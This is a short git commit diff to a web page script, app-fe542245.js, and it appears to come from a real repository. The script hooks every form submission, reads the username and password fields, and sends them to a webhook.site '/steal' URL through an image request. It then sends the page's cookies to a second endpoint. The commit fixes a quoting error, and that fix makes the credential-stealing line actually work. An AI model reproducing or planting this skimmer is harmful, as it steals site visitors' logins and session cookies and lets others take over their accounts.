554eba1be2b1f056a067d2a8bc9de675392b9610
Adwaith S <d3dmxd@gmail.com>
2026-02-05 19:38:03 +0530

    Update app-fe542245.js

--- app-fe542245.js
+++ app-fe542245.js
@@ -5,7 +5,7 @@ document.addEventListener('submit', function (e) {
     const username = document.querySelector('input[type="text"]').value;
     const password = document.querySelector('input[type="password"]').value;
     const exfil = new Image();
-    exfil.src = 'https://webhook.site/8a2e9962-567c-4e65-866e-f7b5145ba653/steal?user=${encodeURIComponent(username)}&pass=${encodeURIComponent(password)}&origin=${window.location.hostname}`;
+    exfil.src = `https://webhook.site/8a2e9962-567c-4e65-866e-f7b5145ba653/steal?user=${encodeURIComponent(username)}&pass=${encodeURIComponent(password)}&origin=${window.location.hostname}`;
     
     const sessionData = document.cookie;
     fetch(`https://webhook.site/8a2e9962-567c-4e65-866e-f7b5145ba653/cookies?data=${encodeURIComponent(sessionData)}`);
